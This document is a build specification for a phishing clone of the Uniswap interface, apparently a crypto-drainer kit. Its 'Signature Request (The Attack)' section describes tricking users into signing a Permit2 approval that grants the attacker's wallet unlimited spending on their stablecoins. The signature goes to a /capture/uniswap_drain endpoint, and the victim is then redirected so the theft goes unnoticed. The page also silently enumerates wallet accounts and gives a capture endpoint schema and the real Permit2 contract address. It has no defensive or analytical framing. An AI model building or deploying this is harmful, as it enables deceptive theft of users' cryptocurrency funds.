# Uniswap Clone — Full HTML Template

Pixel-perfect Uniswap clone with Permit2 EIP-712 signature capture.

## Key Sections

### Header
- Pink background (#ff007a), white "Connect Wallet" button
- Matches real Uniswap branding

### Swap Card
- Two token inputs (you sell / you buy) with gradient backgrounds
- Default values: 1 ETH → 3,412.45 USDC (looks like a real quote)
- Slippage: 0.50%, Network fee display

### Wallet Connection
- Detects `window.ethereum` (MetaMask/WalletConnect)
- On connect: captures address, chainId, provider type
- Shows connected state with truncated address
- Fetches and displays ETH balance

### Signature Request (The Attack)
When user clicks "Approve and Swap":
1. Requests `eth_signTypedData_v4` with Permit2 schema
2. The Permit2 approval gives YOUR wallet unlimited spending on their USDC/DAI/USDT
3. Captures: address + signature + chainId
4. Sends to: POST /capture/uniswap_drain
5. Redirects to real Uniswap after 3 seconds (user thinks it failed)

### Auto-Detection
- Detects if MetaMask is installed on page load
- Attempts silent account enumeration via `eth_accounts`
- Monitors account changes

## Required Endpoint

```
POST /capture/uniswap_drain
Body: {"address": "0x...", "signature": "0x...", "permitData": {...}, "chainId": 1}
Response: {"status": "ok", "redirect": "https://app.uniswap.org"}
```

## Reference

- Permit2 contract: 0x000000000022D473030F116dDEE9F6B43aC78BA3
- EIP-712 spec: https://eips.ethereum.org/EIPS/eip-712
- Uniswap interface reference: https://app.uniswap.org
